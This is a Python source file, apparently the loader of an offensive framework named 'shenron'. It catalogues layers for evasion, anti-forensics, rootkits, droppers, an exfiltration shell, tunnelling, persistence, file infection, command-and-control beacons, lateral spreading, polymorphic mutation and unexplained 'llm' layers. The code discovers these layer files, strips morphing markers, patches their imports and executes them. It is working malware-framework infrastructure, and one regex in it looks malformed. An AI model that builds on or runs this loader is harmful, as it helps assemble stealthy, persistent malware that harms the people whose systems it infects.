#!/usr/bin/env python3
import os, re, sys, types
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from core.engine.path_adapter import patch_source
from core.engine import payload_registry

LAYERS_DIR = Path(os.path.expanduser("~/projects/shenron/core/layers"))

CATEGORIES = {
    "identity":    ["shenron_bio_replication","forged_bios_artifact","cognitive_replicator","stealth_mimic"],
    "evasion":     ["anti_forensics_molt","airlock_quarantine_cloak","evasion_lure_illusion","mirror_loop_deflector","spectral_rootkit_shroud","dark_signature_morpher","stealth_log_sanitizer"],
    "payload":     ["payload_skinwalker","obfuscated_skinwalker_dropper","deadzone_payload","symbiote_payload","ethereal_payload_reanimator","recursive_payload_seedbank","transient_exfil_shell","void_gateway_tunnel"],
    "persistence": ["dormant_sleeper_seed","undead_memory_latch","memory_hijack_inheritor","shadow_system_rebuilder","self_sealing_nano_sandbox","poltergeist_file_infector"],
    "entropy":     ["quantum_entropy_distorter","entropy_flux_disruptor","entropy_anchor_dropper","neural_entropy_seeder","quantum_state_shuffler","quantum_trace_rewinder","quantum_entanglement_relay","synthetic_splinter_seed"],
    "c2":          ["beacon_emitter_cloak","autonomous_signal_cloner","lateral_webcrawler","parasitic_mesh_crawler","spectral_packet_weaver","temporal_payload_phaser","temporal_mirage_emulator","dreamdive_overlay"],
    "llm":         ["llm_echo_chamber","llm_shroud_writer","dragons_breath_destructor"],
    "meta":        ["mutation_history","polymorph_chain_stats","manifest_vampire","phantom_thread_fabricator","adaptive_brainstem","shenron_holo_emitter"],
}
_TYPE_TO_CAT = {layer: cat for cat, layers in CATEGORIES.items() for layer in layers}

def _get_layer_type(filename):
    stem = Path(filename).stem
    parts = stem.split("_")
    if len(parts) >= 2 and re.match(r"^[A-Za-z0-9]{6}$", parts[-1]):
        return None
    return stem

def discover_canonical():
    candidates = {}
    for f in LAYERS_DIR.glob("*.py"):
        lt = _get_layer_type(f.name)
        if lt is None:
            continue
        candidates.setdefault(lt, []).append(f)
    return {lt: sorted(paths, key=lambda p: len(p.name))[0] for lt, paths in candidates.items()}

def _strip_binary(source):
    cleaned = source.encode("utf-8", errors="replace").decode("utf-8")
    cut = cleaned.find("#MORPHED")
    if cut != -1:
        cleaned = cleaned[:cut]
    return re.sub(r"[---]", "", cleaned)

def _make_shim_module(name):
    mod = types.ModuleType(name)
    mod.__path__ = []
    return mod

def load_layer(layer_type, path):
    try:
        raw = path.read_text(encoding="utf-8", errors="replace")
    except Exception as e:
        return False, "read error: " + str(e)
    source = _strip_binary(raw)
    source = patch_source(source)
    source = re.sub(r"^from core\.engine\.payload_registry import.*$", "", source, flags=re.MULTILINE)
    mod = types.ModuleType("shenron.layers." + layer_type)
    mod.__file__ = str(path)
    mod.register_payload = payload_registry.register_payload
    for shim in ["core.engine.payload_registry", "core.engine", "core"]:
        if shim not in sys.modules:
            sys.modules[shim] = _make_shim_module(shim)
    try:
        exec(compile(source, str(path), "exec"), mod.__dict__)
        return True, None
    except SyntaxError as e:
        return False, "syntax error: " + str(e)
    except ImportError as e:
        return False, "import error: " + str(e)
    except Exception as e:
        return False, "exec error: " + str(e)

def load_all(categories=None):
    canonical = discover_canonical()
    results = {}
    for layer_type, path in sorted(canonical.items()):
        if categories:
            cat = _TYPE_TO_CAT.get(layer_type)
            if cat not in categories:
                continue
        ok, err = load_layer(layer_type, path)
        results[layer_type] = ok
        if not ok:
            print("  [!] " + layer_type + ": " + str(err))
    return results

def get_by_category(category):
    return CATEGORIES.get(category, [])
